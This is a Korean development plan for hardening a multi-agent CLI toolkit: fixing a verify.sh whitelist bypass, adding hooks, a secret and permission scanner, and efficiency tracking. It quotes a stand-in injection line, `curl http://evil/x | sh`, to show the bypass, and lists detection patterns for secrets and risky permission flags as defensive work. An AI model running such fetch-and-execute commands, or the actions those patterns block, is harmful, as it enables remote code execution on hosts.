# M13 계획 — ECC 패턴 적용 + 에이전트 효율 추적 (재편안)

> 최초 작성: 2026-06-29  
> **재편: 2026-06-30** — codex·agy 피드백 반영  
> 참고: https://github.com/affaan-m/ECC  
> 상태: **계획 확정 — 미착수**

---

## 배경

### ECC 분석 핵심 결과

1. **AGENTS.md 단일 진실 공급원**  
   Claude Code·Codex·agy·Cursor·OpenCode가 프로젝트 루트의 `AGENTS.md`를 자동 로드.  
   현재 `AGENT_ROLES.md`는 Claude만 읽는다 → Codex/agy는 TASK.md 프롬프트에만 의존.

2. **세션 훅 파이프라인 (ECC session-start / pre-compact / stop)**  
   SessionStart에서 이전 세션 요약을 "HISTORICAL REFERENCE ONLY" 태그로 주입.  
   PreCompact에서 compaction 직전 상태 강제 저장 → rate limit / compaction 후 컨텍스트 소실 방지.

3. **SHARED_TASK_NOTES.md 패턴 (ECC autonomous-loops)**  
   각 에이전트가 시작 시 읽고 완료 후 핵심 결정을 추가하는 이터레이션 간 컨텍스트 브리지.

4. **AgentShield (ECC 보안 모듈)**  
   5개 카테고리(secrets·hook injection·MCP risk·agent config·permissions) 스캔.

5. **에이전트 효율 추적 (신규)**  
   토큰·시간·LOC 수집 → 일별 리뷰 → Claude 배정 결정 객관화.

---

## 에이전트 피드백 요약 (2026-06-30)

codex·agy가 초안 계획을 검토한 결과 두 가지 범주의 문제를 지적했다.

### 범주 A: 기존 결함 미처리

| 문제 | codex 판정 | agy 판정 |
|------|-----------|---------|
| `verify.sh` bash -c 화이트리스트 우회 (RCE) | 부분적 — AgentShield로 불충분 | 부분적 — 구조 수정 필요 |
| `cross-review.sh` API 불일치·full 권한 하드코딩 | 미포함 | 미포함 |
| 공유 상태 락 부재 | 미포함 + M13-C/E가 악화 | 미포함 |
| `worktree-dispatch.sh` 격리 결함 | 미포함 | 미포함 |

### 범주 B: 계획 자체의 기술 버그

| 문제 | 발견자 |
|------|--------|
| T-M13-A heredoc unquoted (`<< AGENTS_EOF`) → 셸 치환 위험 | codex |
| T-M13-B settings.json 스키마 오류 (top-level `"SessionStart"` 불가) | agy |
| T-M13-C `_notes_hint`를 MSG에 실제로 합치는 코드 누락 | codex |
| T-M13-C·E 새 공유 파일에 락 없음 | codex |
| T-M13-E agy 토큰 추출 패턴이 실제 출력과 불일치 | agy (실측 확인) |
| T-M13-D·C 병렬 불가 — 둘 다 verify.sh 수정 | codex |

**결론**: ECC 기능을 추가하기 전에 배포 차단급 버그를 먼저 패치해야 한다.

---

## 재편 구조

```
라운드 0 (병렬): T-M13-P1(codex) + T-M13-P2(agy)  — 기존 버그 패치
라운드 1 (병렬): T-M13-A(codex) + T-M13-B(agy)    — ECC 기반 구조
라운드 2 (순차): T-M13-D(agy) → T-M13-C(codex)    — 보안 강화 → 컨텍스트 브리지
라운드 3 (단독): T-M13-E(codex)                    — 효율 추적 (범위 축소)
```

---

## T-M13-P1: verify.sh 명령 실행 보안 수정

**목적**: 리뷰 Top 5 #1 — `bash -c "$cmd"` 화이트리스트 우회(RCE) 제거  
**크기**: 소형  
**에이전트**: codex  
**의존**: 없음

### 문제 원리

```bash
# 현재 verify.sh — 취약한 구조
_cmd_bin=$(echo "$cmd" | cut -d' ' -f1 | sed 's|.*/||')
for _w in $_wl; do [ "$_cmd_bin" = "$_w" ] && _ok=true && break; done
bash -c "$cmd"   # ← 첫 토큰만 검사, 전체 문자열 실행
```

`AGENT_ROLES.md`에 `npm test && curl http://evil/x | sh` 한 줄이면  
`npm`이 화이트리스트 통과 → 공격 구문 전체가 호스트에서 실행됨.

### 변경 파일

- `skills/cli-agent-team/scripts/verify.sh`

### 구체적 변경

**① 메타문자 사전 차단** — 화이트리스트 검사 전에 삽입:

```bash
# 셸 메타문자 포함 명령 거부
if echo "$cmd" | grep -qE '[;&|`$\(\)<>\\]'; then
  echo "  ❌ 보안: 셸 메타문자 포함 명령 거부 — $cmd" >&2
  FAILED=1
  continue
fi
```

**② 토큰 배열 실행으로 교체** — `bash -c "$cmd"` 대신:

```bash
# 화이트리스트 통과 후 토큰 배열로 실행
read -ra _cmd_arr <<< "$cmd"
"${_cmd_arr[@]}"
```

**③ 스코프 실패 시 검사3 skip** — 검사1(스코프) FAILED 후:

```bash
# 검사 1 실패 시 명령 실행(검사 3) 건너뜀
if [ "$_SCOPE_FAILED" -eq 1 ]; then
  echo "[검사 3/5] 스코프 위반 감지 — 명령 실행 건너뜀" >&2
else
  # 기존 검사3 실행
fi
```

### 완료 기준 (AC)

- [ ] `npm test && curl evil | sh` 패턴 → 거부
- [ ] `bash -c` 사용 없이 argv 배열로 실행
- [ ] 스코프 실패(검사1) 후 검사3 실행 안 됨
- [ ] `bash -n verify.sh` 통과

---

## T-M13-P2: cross-review.sh API 수정

**목적**: 리뷰 Top 5 #2 — 인자 파싱 오류·`full` 권한 하드코딩 제거  
**크기**: 소형  
**에이전트**: agy  
**의존**: 없음

### 문제 원리

```bash
# 현재 cross-review.sh:9-10 (버그)
PROJECT_DIR="${2:-$(pwd)}"   # ← 두 번째 인자를 PROJECT_DIR로 오해
# 호출 의도: cross-review.sh <task-id> <auth-mode> [dir] [tier]
# 실제 동작: auth-mode가 PROJECT_DIR로 들어가 경로 오류 후 크래시
```

### 변경 파일

- `skills/cli-agent-team/scripts/cross-review.sh`

### 구체적 변경

```bash
# 수정: 인터페이스를 agent-team.sh 래퍼와 일치시킴
# cross-review.sh <task-id> <auth-mode> [project-dir] [model-tier]
TASK_ID="${1:?task-id required}"
AUTH_MODE="${2:?auth-mode required: full|limited}"
PROJECT_DIR="${3:-$(pwd)}"
MODEL_TIER="${4:-quality}"

# full 하드코딩 제거 — AUTH_MODE 그대로 사용
# 기존: bash dispatch.sh codex "$TASK_ID" full ...
bash dispatch.sh codex "$TASK_ID" "$AUTH_MODE" "$PROJECT_DIR" review "$MODEL_TIER"
bash dispatch.sh agy   "$TASK_ID" "$AUTH_MODE" "$PROJECT_DIR" review "$MODEL_TIER"
```

### 완료 기준 (AC)

- [ ] `cross-review.sh T001 limited` 호출 시 limited 모드로 dispatch
- [ ] `agent-team.sh cross-review T001 limited .` 호출 시 크래시 없음
- [ ] `full` 하드코딩 없음
- [ ] `bash -n cross-review.sh` 통과

---

## T-M13-A: AGENTS.md 통합

**목적**: Codex/agy가 별도 프롬프트 없이 역할·규칙을 자동 인식  
**크기**: 소형  
**에이전트**: codex  
**의존**: 없음

### 변경 파일

- `skills/cli-agent-team/scripts/init.sh`
- `skills/cli-agent-team/scripts/dispatch.sh`

### 구체적 변경

**`init.sh`** — AGENT_ROLES.md 생성 블록 이후에 AGENTS.md 생성 블록 추가:

```bash
# AGENTS.md 생성 — Codex/agy/Claude 공통 읽기용
AGENTS_FILE="$PROJECT_DIR/AGENTS.md"
if [ ! -f "$AGENTS_FILE" ]; then
  # 주의: << 'AGENTS_EOF' (quoted) — 본문 셸 치환 방지
  PROJECT_NAME_VAL="$PROJECT_NAME"
  cat > "$AGENTS_FILE" << 'AGENTS_EOF'
# AGENTS.md — 프로젝트 에이전트 공통 지침
# Claude Code, Codex, agy 가 프로젝트 시작 시 자동으로 읽습니다.

## 역할

| 에이전트 | 역할 | 작업 범위 |
|---------|-----|---------|
| Claude  | 오케스트레이터 (계획·검토·커밋) | 코드 직접 작성 금지 |
| Codex   | 소~중형 구현 | 1~200줄, 명세 명확한 작업 |
| agy     | 대형 구현·탐색 | 200줄↑, 분석·탐색 작업 |

## 검증 규칙

- 스크립트 문법 확인: `bash -n <파일>` 만 사용 (직접 실행 금지)
- 소스 코드 변경: TASK.md `## 허용 파일` 목록만
- 완료 후 반드시: `_agent_reports/<task-id>/REPORT.md` 작성
- REPORT.md 내 `## AC 체크리스트` 섹션 필수

## 보안 규칙

- API 키·토큰·패스워드 하드코딩 금지
- `rm -rf` / `git reset --hard` 사용 전 확인
- `eval $()` 패턴 금지
- `chmod 777` 금지
AGENTS_EOF
  # PROJECT_NAME은 heredoc 밖에서 치환
  sed -i "s/^# AGENTS.md — 프로젝트 에이전트 공통 지침/# AGENTS.md — ${PROJECT_NAME_VAL}/" "$AGENTS_FILE" 2>/dev/null || true
  echo "[init] AGENTS.md 생성 완료: $AGENTS_FILE"
fi
```

**`dispatch.sh`** — execute MSG 앞에 AGENTS.md 힌트 주입:

```bash
_agents_hint=""
if [ -f "$PROJECT_DIR/AGENTS.md" ]; then
  _agents_hint="시작 전 AGENTS.md를 읽어 역할과 검증 규칙을 확인해줘.

"
fi
MSG="${_agents_hint}_agent_reports/${TASK_ID}/TASK.md 읽고 시작해줘..."
```

### 완료 기준 (AC)

- [ ] `init.sh` 실행 시 `AGENTS.md` 생성됨
- [ ] `AGENTS.md`에 역할 테이블·검증 규칙·보안 규칙 3개 섹션 포함
- [ ] `AGENTS.md` 본문에 셸 치환 흔적 없음 (백틱·`$()` 그대로 텍스트로 저장)
- [ ] `dispatch.sh` execute MSG가 AGENTS.md 존재 시 읽기 지시 포함
- [ ] `bash -n` 문법 검사 통과

---

## T-M13-B: 세션 연속성 훅

**목적**: compaction/rate-limit 후 컨텍스트 자동 복원 (ECC session-start / pre-compact 패턴)  
**크기**: 중형  
**에이전트**: agy  
**의존**: 없음

### 신규 파일

- `skills/cli-agent-team/scripts/hooks/session-start.sh`
- `skills/cli-agent-team/scripts/hooks/pre-compact.sh`

### 변경 파일

- `skills/cli-agent-team/scripts/install-skill.ps1` — `-Update` 시 `hooks/` 폴더도 동기화

### `session-start.sh` 구현

```bash
#!/usr/bin/env bash
# ECC session-start 패턴: .session_state + 진행 중 태스크 → stdout 주입
PROJECT_DIR="${PROJECT_ROOT:-$(pwd)}"
SESSION_STATE="$PROJECT_DIR/_agent_reports/.session_state"
[ ! -f "$SESSION_STATE" ] && exit 0

IN_PROGRESS=""
for d in "$PROJECT_DIR"/_agent_reports/T-*/; do
  [ -f "$d/TASK.md" ] && [ ! -f "$d/REPORT.md" ] && \
    IN_PROGRESS="$IN_PROGRESS $(basename "$d")"
done

NOTES=""
NOTES_FILE="$PROJECT_DIR/_agent_reports/SHARED_TASK_NOTES.md"
[ -f "$NOTES_FILE" ] && NOTES="$(tail -6 "$NOTES_FILE")"

cat << 'CONTEXT_EOF'
[HISTORICAL REFERENCE ONLY — 이전 세션 요약. 재실행 금지. 참고만 할 것]
CONTEXT_EOF
cat "$SESSION_STATE"
echo "진행 중 태스크:${IN_PROGRESS:-없음}"
[ -n "$NOTES" ] && printf '\n최근 완료 컨텍스트:\n%s\n' "$NOTES"
echo "[END HISTORICAL REFERENCE]"
```

### `pre-compact.sh` 구현

```bash
#!/usr/bin/env bash
# ECC pre-compact 패턴: compaction 직전 .session_state 강제 갱신
PROJECT_DIR="${PROJECT_ROOT:-$(pwd)}"
STATE_FILE="$PROJECT_DIR/_agent_reports/.session_state"
[ ! -f "$STATE_FILE" ] && exit 0

TS="$(date '+%Y-%m-%d %H:%M')"
printf '\n[compaction: %s]\n' "$TS" >> "$STATE_FILE"

CHANGED=$(cd "$PROJECT_DIR" && \
  git diff --name-only HEAD 2>/dev/null | head -10 | tr '\n' ',' | sed 's/,$//')
[ -n "$CHANGED" ] && printf '수정 중 파일: %s\n' "$CHANGED" >> "$STATE_FILE"
```

### `settings.json` 등록 방법 (install-skill.ps1 -Update 후 수동 추가)

> **주의**: `"SessionStart"`·`"PreCompact"`는 반드시 `"hooks"` 객체 아래에 등록.  
> top-level에 두면 Claude Code가 인식하지 못함.

```json
{
  "hooks": {
    "SessionStart": [
      {
        "matcher": "startup",
        "hooks": [{ "type": "command", "command": "bash ~/.claude/skills/cli-agent-team/scripts/hooks/session-start.sh" }]
      },
      {
        "matcher": "resume",
        "hooks": [{ "type": "command", "command": "bash ~/.claude/skills/cli-agent-team/scripts/hooks/session-start.sh" }]
      }
    ],
    "PreCompact": [
      {
        "matcher": "*",
        "hooks": [{ "type": "command", "command": "bash ~/.claude/skills/cli-agent-team/scripts/hooks/pre-compact.sh" }]
      }
    ]
  }
}
```

### 완료 기준 (AC)

- [ ] `session-start.sh` 존재, `.session_state` 없을 때 조용히 exit 0
- [ ] `session-start.sh` 출력에 `[HISTORICAL REFERENCE ONLY]` 태그 포함
- [ ] `pre-compact.sh` 실행 시 `.session_state`에 compaction 마커 추가
- [ ] `install-skill.ps1` `-Update` 시 `hooks/` 폴더 동기화
- [ ] `bash -n` 문법 검사 통과 (두 파일 모두)

---

## T-M13-D: AgentShield + verify.sh 보안 강화 (재정의)

**목적**: ① diff 기반 5카테고리 보안 스캐너 신설 ② verify.sh 명령 실행 구조 보안 AC 통합  
**크기**: 중형  
**에이전트**: agy  
**의존**: T-M13-P1 완료 후 (verify.sh 수정 충돌 방지)

> **재정의 이유**: 초안의 AgentShield는 diff 스캔만 커버. 리뷰의 핵심 RCE 경로(verify.sh 런타임 구조)는 T-M13-P1이 먼저 수정하므로, T-M13-D는 그 위에 보안 감사 레이어를 추가하는 역할로 재정의.

### 신규 파일

- `skills/cli-agent-team/scripts/agent-shield.sh`

### 변경 파일

- `skills/cli-agent-team/scripts/verify.sh` — 검사 5/5 교체
- `skills/cli-agent-team/scripts/doctor.sh` — agent-shield.sh 존재 체크 추가

### `agent-shield.sh` 구조

```
exit 0 = clean
exit 1 = warning (통과, 검토 권장)
exit 2 = critical (FAILED 처리, 커밋 차단)
```

| 카테고리 | 탐지 대상 | 판정 |
|---------|----------|------|
| ① secrets | api_key, aws_access_key, GITHUB_TOKEN, -----BEGIN, bearer 토큰 등 14종 | critical |
| ② hook injection | settings.json 변경 + 임시 경로 command | critical |
| ③ MCP risk | claude_desktop_config 변경 + http:// MCP 신규 추가 | warning |
| ④ agent config | TASK.md 허용 파일 누락, auth-mode full 하드코딩 | warning |
| ⑤ permissions | chmod 777, sudo rm, --dangerously-skip-permissions | critical |
| ⑥ 검증 명령 메타문자 | AGENTS.md·AGENT_ROLES.md 검증 명령란에 ;·&&·\|·$() | critical |
| ⑦ untracked 파일 secrets | git diff HEAD 미포함 신규 파일도 스캔 | critical |

```bash
#!/usr/bin/env bash
# agent-shield.sh <project-dir>
set -euo pipefail
PROJECT_DIR="${1:-$(pwd)}"
SHIELD_EXIT=0
SEP="────────────────────────────────────────"

emit() {
  local level="$1" msg="$2"
  echo "  [${level}] ${msg}"
  [ "$level" = "CRITICAL" ] && SHIELD_EXIT=2
  [ "$level" = "WARNING"  ] && [ "$SHIELD_EXIT" -lt 1 ] && SHIELD_EXIT=1
}

SEC_DIFF=$(cd "$PROJECT_DIR" && git diff HEAD 2>/dev/null || true)
UNTRACKED=$(cd "$PROJECT_DIR" && git ls-files --others --exclude-standard 2>/dev/null || true)

echo ""; echo "[AgentShield] 보안 스캔"; echo "$SEP"

# ① secrets — diff + untracked 모두 스캔
SECRET_PAT='(api[_-]?key|aws_access_key|aws_secret|GITHUB_TOKEN|GH_TOKEN|private_key|client_secret|auth_token|-----BEGIN (RSA|EC|OPENSSH)|password[[:space:]]*=[[:space:]]*["'"'"'][^"'"'"']{8,}|token[[:space:]]*[=:][[:space:]]*["'"'"'][A-Za-z0-9_\-]{16,})'
hit=$(printf '%s\n' "$SEC_DIFF" | grep '^+[^+]' | grep -iE "$SECRET_PAT" 2>/dev/null || true)
[ -n "$hit" ] && emit CRITICAL "secrets 패턴 탐지 (diff)" || echo "  ✅ ① secrets (diff) 이상 없음"
if [ -n "$UNTRACKED" ]; then
  while IFS= read -r f; do
    uhit=$(grep -iE "$SECRET_PAT" "$PROJECT_DIR/$f" 2>/dev/null || true)
    [ -n "$uhit" ] && emit CRITICAL "secrets 패턴 탐지 (untracked: $f)"
  done <<< "$UNTRACKED"
fi

# ② hook injection
if printf '%s\n' "$SEC_DIFF" | grep -q 'settings.json\|hooks.json'; then
  bad=$(printf '%s\n' "$SEC_DIFF" | grep '^+' | grep -E '"command"[[:space:]]*:[[:space:]]*"[^~].*(tmp|AppData/Local/Temp|/var/tmp)' || true)
  [ -n "$bad" ] && emit CRITICAL "hook injection 의심 경로" || emit WARNING "settings.json 변경 — 검토 권장"
else
  echo "  ✅ ② hook injection 변경 없음"
fi

# ③ MCP risk
if printf '%s\n' "$SEC_DIFF" | grep -q 'claude_desktop_config\|mcpServers'; then
  bad=$(printf '%s\n' "$SEC_DIFF" | grep '^+' | grep -E '"url"[[:space:]]*:[[:space:]]*"http://' || true)
  [ -n "$bad" ] && emit WARNING "비암호화 http:// MCP 서버 추가" || echo "  ✅ ③ MCP risk 이상 없음"
else
  echo "  ✅ ③ MCP risk 변경 없음"
fi

# ④ agent config
bad=$(printf '%s\n' "$SEC_DIFF" | grep '^+' | grep -E 'auth.?mode.*full|dangerously.bypass.*approvals' || true)
[ -n "$bad" ] && emit WARNING "auth-mode full 하드코딩 탐지" || echo "  ✅ ④ agent config 이상 없음"

# ⑤ permissions
bad=$(printf '%s\n' "$SEC_DIFF" | grep '^+[^+]' | grep -E '(chmod[[:space:]]+777|sudo[[:space:]]+rm|sudo[[:space:]]+chmod|--dangerously-skip-permissions)' || true)
[ -n "$bad" ] && emit CRITICAL "위험 권한 명령 탐지" || echo "  ✅ ⑤ permissions 이상 없음"

# ⑥ 검증 명령 메타문자 (AGENTS.md·AGENT_ROLES.md)
for cfg in "$PROJECT_DIR/AGENTS.md" "$PROJECT_DIR/AGENT_ROLES.md"; do
  [ ! -f "$cfg" ] && continue
  meta=$(grep -E '^[[:space:]]*[-*].*:.*[;&|`]|\$\(' "$cfg" 2>/dev/null || true)
  [ -n "$meta" ] && emit CRITICAL "검증 명령 메타문자 탐지: $(basename "$cfg")"
done
echo "  ✅ ⑥ 검증 명령 메타문자 이상 없음 (또는 탐지됨 — 위 출력 확인)"

# ⑦ untracked secrets (이미 ①에서 처리됨)
echo "  ✅ ⑦ untracked 파일 스캔 완료"

echo "$SEP"
case "$SHIELD_EXIT" in
  0) echo "  ✅ AgentShield: 전체 통과" ;;
  1) echo "  ⚠  AgentShield: Warning (통과, 검토 권장)" ;;
  2) echo "  ❌ AgentShield: Critical — 커밋 차단" ;;
esac
exit "$SHIELD_EXIT"
```

### `verify.sh` — 검사 5/5 교체

```bash
# ── 5. AgentShield 보안 스캔 ──────────────────────────────────────
echo ""; echo "[검사 5/5] AgentShield 보안 스캔"

SHIELD_EXIT=0
if [ -f "$SCRIPT_DIR/agent-shield.sh" ]; then
  bash "$SCRIPT_DIR/agent-shield.sh" "$PROJECT_DIR" || SHIELD_EXIT=$?
else
  # fallback: 기존 grep 방식 유지
  :
fi

if [ "$SHIELD_EXIT" -eq 2 ]; then
  FAILED=1
  FAIL_REASON="${FAIL_REASON:-SEC_PATTERN}"
elif [ "$SHIELD_EXIT" -eq 1 ]; then
  echo "  ⚠ Warning — 커밋 허용, 검토 권장"
fi
```

### 완료 기준 (AC)

- [ ] `agent-shield.sh` 7개 카테고리 구현 (⑥⑦ 추가)
- [ ] Critical 입력 → exit 2, Warning → exit 1, clean → exit 0
- [ ] `verify.sh` 검사 5/5가 agent-shield.sh 호출로 교체
- [ ] agent-shield.sh 없을 때 기존 grep fallback 동작
- [ ] `doctor.sh`에 agent-shield.sh 존재 체크 추가
- [ ] `bash -n` 통과

---

## T-M13-C: SHARED_TASK_NOTES.md 컨텍스트 브리지

**목적**: 이터레이션 간 에이전트 결정사항 보존  
**크기**: 소형  
**에이전트**: codex  
**의존**: T-M13-A 완료 후 (dispatch.sh 수정 충돌), T-M13-D 완료 후 (verify.sh 수정 충돌)

### 변경 파일

- `skills/cli-agent-team/scripts/dispatch.sh`
- `skills/cli-agent-team/scripts/verify.sh`
- `skills/cli-agent-team/scripts/init.sh`

### `dispatch.sh` — execute MSG에 NOTES 힌트 추가 및 실제 MSG 결합

```bash
_notes_hint=""
NOTES_FILE="$PROJECT_DIR/_agent_reports/SHARED_TASK_NOTES.md"
if [ -f "$NOTES_FILE" ] && [ -s "$NOTES_FILE" ]; then
  _notes_hint="
【컨텍스트 브리지】 _agent_reports/SHARED_TASK_NOTES.md를 읽어 이전 태스크의 핵심 결정사항을 파악해줘. 이 태스크 완료 후 핵심 결정(변경 파일·이유·다음 주의사항)을 NOTES 하단에 추가해줘."
fi

# MSG 구성 — _agents_hint와 _notes_hint 모두 실제로 결합
MSG="${_agents_hint}${_notes_hint}
_agent_reports/${TASK_ID}/TASK.md 읽고 시작해줘. ..."
```

### `verify.sh` — 검증 통과 후 NOTES 자동 append (flock 락 사용)

```bash
# SHARED_TASK_NOTES.md 업데이트 (검증 통과 시에만, 락 사용)
_NOTES_FILE="$PROJECT_DIR/_agent_reports/SHARED_TASK_NOTES.md"
if [ -f "$_NOTES_FILE" ] && [ "${FAILED:-1}" -eq 0 ]; then
  _CHANGED=$(cd "$PROJECT_DIR" && \
    git diff --name-only HEAD 2>/dev/null | tr '\n' ',' | sed 's/,$//')
  (
    flock -w 10 200 2>/dev/null || true
    printf '\n## [%s] %s (%s) 완료\n- 변경: %s\n' \
      "$(date '+%Y-%m-%d %H:%M')" "$TASK_ID" "${_AGENT:-unknown}" \
      "${_CHANGED:-없음}" >> "$_NOTES_FILE"
  ) 200>"${_NOTES_FILE}.lock"
fi
```

### `init.sh` — 초기화 시 SHARED_TASK_NOTES.md 생성

```bash
NOTES_FILE="$PROJECT_DIR/_agent_reports/SHARED_TASK_NOTES.md"
if [ ! -f "$NOTES_FILE" ]; then
  cat > "$NOTES_FILE" << 'NOTES_EOF'
# SHARED_TASK_NOTES.md — 이터레이션 간 컨텍스트 브리지
# 각 에이전트가 태스크 시작 시 읽고 완료 후 핵심 결정을 추가합니다.
NOTES_EOF
  echo "[init] SHARED_TASK_NOTES.md 생성: $NOTES_FILE"
fi
```

### 완료 기준 (AC)

- [ ] `init.sh` 실행 시 `SHARED_TASK_NOTES.md` 생성됨
- [ ] `dispatch.sh` execute MSG에 `_notes_hint`가 실제로 포함됨 (빈 문자열 합치기 버그 없음)
- [ ] `verify.sh` 검증 통과 후 NOTES에 `[날짜] TASK_ID (agent) 완료` append
- [ ] flock 락 사용 (병렬 append 충돌 방지)
- [ ] NOTES 파일 없을 때 verify.sh 오류 없이 건너뜀
- [ ] `bash -n` 통과

---

## T-M13-E: 에이전트 효율 추적 시스템 (범위 축소)

**목적**: 토큰·시간·LOC 수집 → 일별 리뷰 → Claude 배정 결정 객관화  
**크기**: 중형  
**에이전트**: codex  
**의존**: 없음

> **범위 축소 이유**: agy 실측 결과 `"N input tokens, M output tokens"` 패턴이 실제 출력에 없음.  
> agy 토큰 추출은 실제 출력 샘플 확인 후 별도 패치로 추가. 이번 구현은 codex만 실제 추출, agy는 `null` fallback.

### 데이터 흐름

```
dispatch.sh 완료 직전
  └─ 로그에서 토큰 추출 (codex만 / agy는 null)
  └─ 경과 시간 = now - DISPATCH_START_TS
  └─ _agent_reports/<task-id>/.task_meta.json 저장

verify.sh 검증 통과 후
  └─ git diff --stat → LOC(추가/삭제) 집계
  └─ .task_meta.json에 loc_added, loc_deleted, ac_pass, ac_fail 추가

record-score.sh
  └─ .task_meta.json 읽기
  └─ _agent_reports/.agent_metrics.json 누적

daily-review.sh (수동 호출)
  └─ .agent_metrics.json → daily/YYYY-MM-DD.md
```

### `dispatch.sh` — 토큰 추출 (codex only)

```bash
_extract_tokens() {
  local log="$1" agent="$2"
  case "$agent" in
    codex)
      grep -A1 -iE "^tokens used$" "$log" 2>/dev/null \
        | grep -E "^[0-9,]+" | tr -d ',' | tail -1 || \
      grep -oE "[0-9,]+ tokens" "$log" 2>/dev/null \
        | grep -oE "^[0-9,]+" | tr -d ',' | tail -1 || echo 0
      ;;
    agy)
      # TODO: 실제 agy --print 출력 샘플 확인 후 패턴 추가
      # 현재는 null 반환 — .task_meta.json에 "tokens_used": null 저장
      echo "null"
      ;;
    *) echo 0 ;;
  esac
}

_ELAPSED=$(( $(date +%s 2>/dev/null || echo 0) - ${DISPATCH_START_TS:-0} ))
_TOKENS=$(_extract_tokens "${LOG_FILE:-/dev/null}" "$CLI")
_META_FILE="${TASK_DIR}/.task_meta.json"
_FALLBACK=$([ "${CLI}" = "codex" ] && [ -f "${TASK_DIR}/_codex_fallback.log" ] && echo true || echo false)

if command -v jq >/dev/null 2>&1; then
  jq -n \
    --arg  task_id   "$TASK_ID" \
    --arg  agent     "$CLI" \
    --arg  task_type "${_TASK_TYPE:-unknown}" \
    --arg  date      "$(date +%Y-%m-%d)" \
    --argjson elapsed  "${_ELAPSED:-0}" \
    --argjson start_ts "${DISPATCH_START_TS:-0}" \
    --argjson fallback "$_FALLBACK" \
    --argjson tokens   "${_TOKENS:-0}" \
    '{task_id:$task_id, agent:$agent, task_type:$task_type, date:$date,
      started_ts:$start_ts, elapsed_sec:$elapsed, tokens_used:$tokens,
      loc_added:0, loc_deleted:0, ac_pass:0, ac_fail:0, fallback_used:$fallback
     }' > "$_META_FILE" 2>/dev/null || true
fi
```

### `verify.sh` — LOC + AC 추가

```bash
_META="$PROJECT_DIR/_agent_reports/$TASK_ID/.task_meta.json"
if [ -f "$_META" ] && command -v jq >/dev/null 2>&1; then
  _LOC_A=$(cd "$PROJECT_DIR" && git diff --stat HEAD 2>/dev/null \
    | grep -oE "[0-9]+ insertion" | grep -oE "[0-9]+" | awk '{s+=$1} END{print s+0}')
  _LOC_D=$(cd "$PROJECT_DIR" && git diff --stat HEAD 2>/dev/null \
    | grep -oE "[0-9]+ deletion"  | grep -oE "[0-9]+" | awk '{s+=$1} END{print s+0}')
  jq \
    --argjson la "${_LOC_A:-0}" \
    --argjson ld "${_LOC_D:-0}" \
    --argjson ap "${_AC_PASS:-0}" \
    --argjson af "${_AC_FAIL:-0}" \
    '.loc_added=$la | .loc_deleted=$ld | .ac_pass=$ap | .ac_fail=$af' \
    "$_META" > "${_META}.tmp" && mv "${_META}.tmp" "$_META" || true
fi
```

### `daily-review.sh` 출력 형식

```markdown
# 에이전트 효율 리뷰 — YYYY-MM-DD

## 오늘 요약
| 에이전트 | 태스크 | AC 통과율 | 총 토큰 | 토큰/태스크 | 평균 소요 | 총 LOC | 토큰/LOC |
| codex   | N건   | X%       | NNN,000 | ...        | ...s    | ...  | ...    |
| agy     | N건   | X%       | —(미수집)| —          | ...s    | ...  | —      |

## 태스크 유형별 효율 비교 (codex 기준)
[agy 토큰 데이터 없음 — 샘플 수집 후 업데이트 예정]

## 개별 태스크 기록
[테이블]

## 다음 세션 Claude 배정 참고
[효율 우위 및 부하 현황]
```

### 완료 기준 (AC)

- [ ] `dispatch.sh` 완료 시 `.task_meta.json` 생성 (codex: tokens 실수, agy: tokens null)
- [ ] `verify.sh` 통과 시 `.task_meta.json`에 loc/ac 추가됨
- [ ] `record-score.sh` 호출 시 `.agent_metrics.json`에 레코드 누적
- [ ] `daily-review.sh` 실행 시 `daily/YYYY-MM-DD.md` 생성
- [ ] daily-review.md에 agy 토큰 미수집 표기 포함
- [ ] jq 미설치 환경에서 오류 없이 건너뜀
- [ ] `bash -n` 통과

---

## 태스크 배정 계획 (재편)

| ID | 설명 | 에이전트 | 크기 | 의존 |
|----|------|---------|-----|------|
| T-M13-P1 | verify.sh 실행 보안: 메타문자 차단 + bash -c 제거 + 스코프 실패 시 검사3 skip | codex | 소형 | — |
| T-M13-P2 | cross-review.sh API 수정 + full 권한 하드코딩 제거 | agy | 소형 | — |
| T-M13-A | AGENTS.md 통합 (heredoc quoting 수정 포함) | codex | 소형 | P1 후 |
| T-M13-B | 세션 연속성 훅 (settings.json 스키마 수정 포함) | agy | 중형 | P2 후 |
| T-M13-D | AgentShield 7카테고리 + verify.sh 보안 AC 통합 | agy | 중형 | A·B 후 |
| T-M13-C | SHARED_TASK_NOTES 브리지 (MSG 결합 수정 + 락) | codex | 소형 | D 후 |
| T-M13-E | 에이전트 효율 추적 (codex 토큰 실추출, agy null) | codex | 중형 | C 후 |

**라운드 0 (병렬)**: T-M13-P1(codex) + T-M13-P2(agy) — 버그 패치  
**라운드 1 (병렬)**: T-M13-A(codex) + T-M13-B(agy) — ECC 기반  
**라운드 2 (순차)**: T-M13-D(agy) → T-M13-C(codex) — 보안·컨텍스트  
**라운드 3 (단독)**: T-M13-E(codex) — 효율 추적

> **순차 이유**: D와 C 모두 verify.sh를 수정 → 병렬 시 충돌.  
> A·C·E 모두 dispatch.sh를 수정 → P1→A→(D·C)→E 순서로 단계별 처리.

---

## 파일 생성·수정 요약 (재편)

| 파일 | 작업 | 태스크 |
|------|------|--------|
| `scripts/verify.sh` | 메타문자 차단 + bash -c 제거 + AgentShield 연동 + LOC/AC + NOTES append | P1, D, C, E |
| `scripts/cross-review.sh` | 인자 파싱 수정 + full 하드코딩 제거 | P2 |
| `scripts/init.sh` | AGENTS.md 생성(quoted heredoc) + SHARED_TASK_NOTES.md 생성 | A, C |
| `scripts/dispatch.sh` | AGENTS.md 힌트 + NOTES 힌트(실제 결합) + 토큰 추출 + .task_meta.json | A, C, E |
| `scripts/record-score.sh` | .agent_metrics.json 누적 추가 | E |
| `scripts/doctor.sh` | agent-shield.sh 존재 체크 추가 | D |
| `scripts/dashboard.sh` | 오늘 효율 요약 1줄 추가 | E |
| `SKILL.md` | 단계 1.6 효율 보정 기준 추가 (agy null 처리 포함) | E |
| `scripts/agent-shield.sh` | **신규** — 7카테고리 보안 스캐너 | D |
| `scripts/daily-review.sh` | **신규** — 일별 효율 리뷰 생성 | E |
| `scripts/hooks/session-start.sh` | **신규** — SessionStart 훅 | B |
| `scripts/hooks/pre-compact.sh` | **신규** — PreCompact 훅 | B |
| `scripts/install-skill.ps1` | `-Update` 시 `hooks/` 동기화 추가 | B |

---

## M14 후보 (agy 권고, 이번 M13 범위 외)

1. `worktree-dispatch.sh` 격리 보장 — uncommitted 변경 시 자동 무력화 방지, 실패 작업 partial merge 차단, 삭제·rename·권한 변경 반영, EXIT/INT/TERM cleanup trap
